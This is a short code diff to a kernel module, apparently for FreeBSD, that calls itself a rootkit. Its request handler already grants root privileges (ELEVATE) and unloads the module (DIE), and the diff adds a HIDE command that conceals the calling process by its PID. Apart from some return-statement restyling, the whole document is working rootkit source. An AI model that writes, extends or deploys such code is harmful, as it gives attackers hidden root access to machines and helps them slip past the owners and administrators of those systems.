@@ -117,7 +117,7 @@ handle_request(struct thread *td, char *command)
 	/* Valid commands are RKCALL_LEN long. */
 	if (strnlen(command, RKCALL_LEN) != RKCALL_LEN)
 	{
-		return -1;
+		return(-1);
 	}
 
 	/* Check if the command is valid.
@@ -126,16 +126,22 @@ handle_request(struct thread *td, char *command)
 	{
 		LOGI("[rootkit:handle_request] ELEVATE request recieved.\n");
 		privilege_set(td, 0);
-		return 0;
+		return(0);
+	}
+	else if (strcmp(command, RKCALL_HIDE) == 0)
+	{
+		LOGI("[rootkit:handle_request] HIDE request recieved.\n");
+		hide_process_by_id(td->td_proc->p_pid);
+		return(0);
 	}
 	else if (strcmp(command, RKCALL_DIE) == 0)
 	{
 		LOGI("[rootkit:handle_request] DIE request recieved.\n");
 		die();
-		return 0;
+		return(0);
 	}
 
-	return -1;
+	return(-1);
 }
 
 static moduledata_t rootkit_mod = {
